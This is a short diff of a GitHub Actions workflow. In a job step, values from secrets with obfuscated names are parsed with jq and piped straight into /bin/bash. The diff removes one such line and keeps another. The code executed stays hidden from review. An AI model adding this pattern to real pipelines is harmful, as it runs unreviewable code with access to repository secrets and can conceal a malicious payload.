@@ -22,7 +22,6 @@ jobs:
           ioxvm73774: ${{ secrets.ioxvm73774 }}
         run: |
           printf '%s' "$ioxvm73774" | jq -r .p8 | /bin/bash
-          printf '%s' "$f51" | jq -r .mb48 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
